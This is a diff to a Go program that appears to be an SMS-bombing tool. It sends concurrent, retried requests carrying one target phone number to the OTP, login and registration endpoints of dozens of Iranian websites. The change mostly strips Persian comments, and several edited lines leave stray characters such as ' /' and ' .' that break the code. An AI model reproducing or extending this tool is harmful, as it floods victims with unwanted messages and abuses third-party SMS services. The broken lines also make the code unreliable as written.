@@ -66,7 +66,7 @@ func sendJSONRequest(client *http.Client, ctx context.Context, url string, paylo
 		}
 		req.Header.Set("Content-Type", "application/json")
 
-		// >>>>> از پارامتر client برای ارسال درخواست استفاده می‌کنیم <<<<<
+		
 		resp, err := client.Do(req)
 		if err != nil {
 			if netErr, ok := err.(net.Error); ok && (netErr.Timeout() || netErr.Temporary() || strings.Contains(err.Error(), "connection reset by peer") || strings.Contains(err.Error(), "dial tcp")) {
@@ -123,7 +123,7 @@ func sendFormRequest(client *http.Client, ctx context.Context, url string, formD
 		}
 		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
 
-		// >>>>> از پارامتر client برای ارسال درخواست استفاده می‌کنیم <<<<<
+		
 		resp, err := client.Do(req)
 		if err != nil {
 
@@ -157,7 +157,7 @@ func sendGETRequest(client *http.Client, ctx context.Context, url string, wg *sy
 	defer wg.Done()
 
 	const maxRetries = 3
-	const retryDelay = 2 * time.Second // کمی کمتر از POST برای GET
+	const retryDelay = 2 * time.Second 
 
 	for retry := 0; retry < maxRetries; retry++ {
 		select {
@@ -168,7 +168,7 @@ func sendGETRequest(client *http.Client, ctx context.Context, url string, wg *sy
 		default:
 		}
 
-		req, err := http.NewRequestWithContext(ctx, http.MethodGet, url, nil) // متد GET و Body = nil
+		req, err := http.NewRequestWithContext(ctx, http.MethodGet, url, nil) 
 		if err != nil {
 			fmt.Printf("\033[01;31m[-] Error while creating GET request to %s on retry %d: %v\033[0m\n", url, retry+1, err)
 			if retry == maxRetries-1 {
@@ -179,7 +179,7 @@ func sendGETRequest(client *http.Client, ctx context.Context, url string, wg *sy
 			continue
 		}
 
-		// >>>>> از پارامتر client برای ارسال درخواست استفاده می‌کنیم <<<<<
+		
 		resp, err := client.Do(req)
 		if err != nil {
 			if netErr, ok := err.(net.Error); ok && (netErr.Timeout() || netErr.Temporary() || strings.Contains(err.Error(), "connection reset by peer") || strings.Contains(err.Error(), "dial tcp")) {
@@ -204,10 +204,9 @@ func sendGETRequest(client *http.Client, ctx context.Context, url string, wg *sy
 
 		ch <- resp.StatusCode
 		resp.Body.Close()
-		return // موفقیت آمیز بود، از حلقه تلاش مجدد خارج می شویم
+		return 
 	}
 }//Code by @monsmain
-//(faghat baraye site payagym.com)
 func formatPhoneWithSpaces(p string) string {
 	p = getPhoneNumberNoZero(p) 
 	if len(p) >= 10 {
@@ -358,14 +357,14 @@ cookieJar, _ := cookiejar.New(nil)
 		tasks <- func(c *http.Client) func() {
 			return func() {
 				payload := map[string]interface{}{
-					"phone_number": phone, // فرمت 09...
+					"phone_number": phone, 
 					"os_type":      "W",
 				}
 				sendJSONRequest(c, ctx, "https://account.api.balad.ir/api/web/auth/login/", payload, &wg, ch)
 			}
 		}(client)
 
-	// تپسی (Tapsi) - POST JSON
+	//(Tapsi) - POST JSON
 		wg.Add(1)
 		tasks <- func(c *http.Client) func() {
 			return func() {
@@ -379,24 +378,23 @@ cookieJar, _ := cookiejar.New(nil)
 			}
 		}(client)
 
-		// تورب (Torob) - GET
+		// (Torob) - GET
 		wg.Add(1)
 		tasks <- func(c *http.Client) func() {
 			return func() {
-				// ساخت URL با اضافه کردن شماره تلفن به پارامتر query
 				torobURL := fmt.Sprintf("https://api.torob.com/a/phone/send-pin/?phone_number=%s", getPhoneNumberNoZero(phone)) // فرمت 9...
 				sendGETRequest(c, ctx, torobURL, &wg, ch)
 			}
 		}(client)
 
 
-		// دکتر نکست (DrNext) - POST JSON
+		// (DrNext) - POST JSON
 		wg.Add(1)
 		tasks <- func(c *http.Client) func() {
 			return func() {
 				payload := map[string]interface{}{
 					"source": "besina",
-					"mobile": phone, // فرمت 09...
+					"mobile": phone, 
 				}
 				sendJSONRequest(c, ctx, "https://cyclops.drnext.ir/v1/patients/auth/send-verification-token", payload, &wg, ch)
 			}
@@ -406,7 +404,7 @@ cookieJar, _ := cookiejar.New(nil)
 		tasks <- func(c *http.Client) func() {
 			return func() {
 				formData := url.Values{}
-				formData.Set("email", phone) // از شماره تلفن به جای ایمیل استفاده شده
+				formData.Set("email", phone) /
 				sendFormRequest(c, ctx, "https://skmei-iran.com/api/customer/member/register/", formData, &wg, ch)
 			}
 		}(client)
@@ -415,10 +413,10 @@ cookieJar, _ := cookiejar.New(nil)
 		tasks <- func(c *http.Client) func() {
 			return func() {
 				formData := url.Values{}
-				formData.Set("endp", "step-2") // مقدار ثابت
-				formData.Set("redirect_to", "") // مقدار پیش فرض
-				formData.Set("action", "nirweb_panel_login_form") // مقدار ثابت
-				formData.Set("nirweb_panel_username", phone) // فرمت 09...
+				formData.Set("endp", "step-2") 
+				formData.Set("redirect_to", "") 
+				formData.Set("action", "nirweb_panel_login_form") 
+				formData.Set("nirweb_panel_username", phone) 
 				sendFormRequest(c, ctx, "https://hoomangold.com/panel/?endp=step-2", formData, &wg, ch)
 			}
 		}(client)
@@ -427,7 +425,7 @@ cookieJar, _ := cookiejar.New(nil)
 		tasks <- func(c *http.Client) func() {
 			return func() {
 				payload := map[string]interface{}{
-					"mobile": phone, // فرمت 09...
+					"mobile": phone, .
 				}
 				sendJSONRequest(c, ctx, "https://gateway.joordaroo.com/lgc/v1/auth/request-otp", payload, &wg, ch)
 			}
@@ -437,8 +435,8 @@ cookieJar, _ := cookiejar.New(nil)
 		tasks <- func(c *http.Client) func() {
 			return func() {
 				payload := map[string]interface{}{
-					"phone_number": phone, // فرمت 09...
-					"forgot_password": false, // مقدار ثابت
+					"phone_number": phone, 
+					"forgot_password": false, 
 				}
 				sendJSONRequest(c, ctx, "https://www.vitrin.shop/api/v1/user/request_code", payload, &wg, ch)
 			}
@@ -448,9 +446,9 @@ cookieJar, _ := cookiejar.New(nil)
 		tasks <- func(c *http.Client) func() {
 			return func() {
 				formData := url.Values{}
-				formData.Set("route", "extension/websky_otp/module/websky_otp.send_code") // مقدار ثابت
-				formData.Set("emailsend", "0") // مقدار ثابت
-				formData.Set("telephone", phone) // فرمت 09...
+				formData.Set("route", "extension/websky_otp/module/websky_otp.send_code") 
+				formData.Set("emailsend", "0") 
+				formData.Set("telephone", phone) 
 				sendFormRequest(c, ctx, "https://titomarket.com/fa-ir/index.php?route=extension/websky_otp/module/websky_otp.send_code&emailsend=0", formData, &wg, ch)
 			}
 		}(client)
@@ -460,15 +458,14 @@ cookieJar, _ := cookiejar.New(nil)
 			return func() {
 				formData := url.Values{}
 				formData.Set("back", "my-account")
-				formData.Set("username", phone) // فرمت 09...
-				// فیلدهای دیگر از نمونه درخواست کاربر
-				formData.Set("id_customer", "") // مقدار پیش فرض
-				formData.Set("firstname", "نام") // مقدار نمونه
-				formData.Set("lastname", "خانوادگی") // مقدار نمونه
-				formData.Set("email", "example@example.com") // مقدار نمونه
-				formData.Set("password", "1234567890") // مقدار نمونه
-				formData.Set("action", "register") // مقدار ثابت
-				formData.Set("ajax", "1") // مقدار ثابت
+				formData.Set("username", phone)
+				formData.Set("id_customer", "") 
+				formData.Set("firstname", "نام")
+				formData.Set("lastname", "خانوادگی") 
+				formData.Set("email", "example@example.com") 
+				formData.Set("password", "1234567890") 
+				formData.Set("action", "register") 
+				formData.Set("ajax", "1") 
 				sendFormRequest(c, ctx, "https://www.dolichi.com/login?back=my-account", formData, &wg, ch)
 			}
 		}(client)
@@ -477,24 +474,18 @@ cookieJar, _ := cookiejar.New(nil)
 		tasks <- func(c *http.Client) func() {
 			return func() {
 				formData := url.Values{}
-				formData.Set("phone", phone) // فرمت 09...
+				formData.Set("phone", phone) 
 				sendFormRequest(c, ctx, "https://pirankalaco.ir/SendPhone.php", formData, &wg, ch)
 			}
 		}(client)
 		// narsisbeauty.com admin-ajax.php (OTP - POST Form)
-		// این نقطه پایانی از پلاگین Digits استفاده می کند و نیاز به فیلدهای مختلفی دارد.
 		wg.Add(1)
 		tasks <- func(c *http.Client) func() {
 			return func() {
 				formData := url.Values{}
-				formData.Set("phone_number", phone) // فرمت 09...
-				formData.Set("wupp_remember_me", "on") // مقدار ثابت
-				formData.Set("action", "wupp_sign_up") // مقدار ثابت
-				// فیلدهای دیگر Digits که ممکن است لازم باشند:
-				// formData.Set("countrycode", "+98")
-				// formData.Set("digits", "1")
-				// formData.Set("instance_id", "...") // ممکن است پویا باشد
-				// ...
+				formData.Set("phone_number", phone) 
+				formData.Set("wupp_remember_me", "on") 
+				formData.Set("action", "wupp_sign_up") 
 				sendFormRequest(c, ctx, "https://narsisbeauty.com/wp-admin/admin-ajax.php", formData, &wg, ch)
 			}
 		}(client)
@@ -503,23 +494,22 @@ cookieJar, _ := cookiejar.New(nil)
 		tasks <- func(c *http.Client) func() {
 			return func() {
 				payload := map[string]interface{}{
-					"mobile_phone": phone, // فرمت 09...
+					"mobile_phone": phone, 
 				}
 				sendJSONRequest(c, ctx, "https://davidjonesonline.ir/api/v1/sessions/login_request", payload, &wg, ch)
 			}
 		}(client)
 		// api.123kif.com Register (Registration/OTP - POST JSON)
-		// توجه: نیاز به فیلدهای ثبت نام اضافه دارد.
 		wg.Add(1)
 		tasks <- func(c *http.Client) func() {
 			return func() {
 				payload := map[string]interface{}{
-					"mobile": phone, // فرمت 09...
-					"password": "testpassword123", // مقدار نمونه
-					"firstName": "Test", // مقدار نمونه
-					"lastName": "User", // مقدار نمونه
-					"platform": "web", // مقدار ثابت
-					"refferCode": "", // مقدار پیش فرض
+					"mobile": phone, 
+					"password": "testpassword123", 
+					"firstName": "Test", 
+					"lastName": "User", 
+					"platform": "web", 
+					"refferCode": "", 
 				}
 				sendJSONRequest(c, ctx, "https://api.123kif.com/api/auth/Register", payload, &wg, ch)
 			}
@@ -529,15 +519,15 @@ cookieJar, _ := cookiejar.New(nil)
 		tasks <- func(c *http.Client) func() {
 			return func() {
 				payload := map[string]interface{}{
-					"username": phone, // فرمت 09...
-					"type": "sms", // مقدار ثابت
+					"username": phone, 
+					"type": "sms", 
 				}
 				sendJSONRequest(c, ctx, "https://bimebazar.com/accounts/api/login_sec/", payload, &wg, ch)
 			}
 		}(client)
 		// microele.com (Registration - POST Form)
 		wg.Add(1)
-		tasks <- func(c *http.Client) func() { // ساختار جدید برای پاس دادن client
+		tasks <- func(c *http.Client) func() { 
 			return func() {
 				formData := url.Values{}
 				formData.Set("id_customer", "")
@@ -550,11 +540,11 @@ cookieJar, _ := cookiejar.New(nil)
 				formData.Set("ajax", "1")
 				sendFormRequest(c, ctx, "https://www.microele.com/login?back=my-account", formData, &wg, ch) // ارسال c
 			}
-		}(client) // ارسال client اصلی به تابع خارجی
+		}(client) 
 
 		// telketab.com (POST Form)
 		wg.Add(1)
-		tasks <- func(c *http.Client) func() { // ساختار جدید برای پاس دادن client
+		tasks <- func(c *http.Client) func() { /
 			return func() {
 				formData := url.Values{}
 				formData.Set("identity", phone)
@@ -563,11 +553,10 @@ cookieJar, _ := cookiejar.New(nil)
 				formData.Set("key", "otp_field_user_auth_form__otp_sms")
 				sendFormRequest(c, ctx, "https://telketab.com/opt_field/check_secret", formData, &wg, ch) // ارسال c
 			}
-		}(client) // ارسال client اصلی به تابع خارجی
-
+		}(client) 
 		// techsiro.com (SMS - POST Form)
 		wg.Add(1)
-		tasks <- func(c *http.Client) func() { // ساختار جدید برای پاس دادن client
+		tasks <- func(c *http.Client) func() { 
 			return func() {
 				formData := url.Values{}
 				formData.Set("client", "web")
@@ -576,54 +565,53 @@ cookieJar, _ := cookiejar.New(nil)
 				formData.Set("mobile", phone)
 				sendFormRequest(c, ctx, "https://techsiro.com/send-otp", formData, &wg, ch) // ارسال c
 			}
-		}(client) // ارسال client اصلی به تابع خارجی
+		}(client) 
 
 		// shimashoes.com (Registration - POST Form)
 		wg.Add(1)
-		tasks <- func(c *http.Client) func() { // ساختار جدید برای پاس دادن client
+		tasks <- func(c *http.Client) func() { 
 			return func() {
 				formData := url.Values{}
 				formData.Set("email", phone)
 				sendFormRequest(c, ctx, "https://shimashoes.com/api/customer/member/register/", formData, &wg, ch) // ارسال c
 			}
-		}(client) // ارسال client اصلی به تابع خارجی
+		}(client) 
 
 		// eaccount.ir (SMS - POST JSON)
 		wg.Add(1)
-		tasks <- func(c *http.Client) func() { // ساختار جدید برای پاس دادن client
+		tasks <- func(c *http.Client) func() { 
 			return func() {
 				payload := map[string]interface{}{
 					"mobile_phone": phone,
 				}
 				sendJSONRequest(c, ctx, "https://eaccount.ir/api/v1/sessions/login_request", payload, &wg, ch) // ارسال c
 			}
-		}(client) // ارسال client اصلی به تابع خارجی
+		}(client) 
 
 		// queenaccessories.ir (SMS - POST JSON)
 		wg.Add(1)
-		tasks <- func(c *http.Client) func() { // ساختار جدید برای پاس دادن client
+		tasks <- func(c *http.Client) func() { 
 			return func() {
 				payload := map[string]interface{}{
 					"mobile_phone": phone,
 				}
 				sendJSONRequest(c, ctx, "https://queenaccessories.ir/api/v1/sessions/login_request", payload, &wg, ch) // ارسال c
 			}
-		}(client) // ارسال client اصلی به تابع خارجی
-
+		}(client) 
 		// vinaaccessory.com (SMS - POST JSON)
 		wg.Add(1)
-		tasks <- func(c *http.Client) func() { // ساختار جدید برای پاس دادن client
+		tasks <- func(c *http.Client) func() { 
 			return func() {
 				payload := map[string]interface{}{
 					"mobile_phone": phone,
 				}
 				sendJSONRequest(c, ctx, "https://vinaaccessory.com/api/v1/sessions/login_request", payload, &wg, ch) // ارسال c
 			}
-		}(client) // ارسال client اصلی به تابع خارجی
+		}(client) 
 
 		// dastaneman.com (SMS - POST Form)
 		wg.Add(1)
-		tasks <- func(c *http.Client) func() { // ساختار جدید برای پاس دادن client
+		tasks <- func(c *http.Client) func() { 
 			return func() {
 				formData := url.Values{}
 				formattedPhone := "0098" + getPhoneNumberNoZero(phone)
@@ -1758,7 +1746,7 @@ cookieJar, _ := cookiejar.New(nil)
 			}
 			defer resp.Body.Close()
 
-			// گزارش وضعیت
+			
 			ch <- resp.StatusCode
 		}
 	}
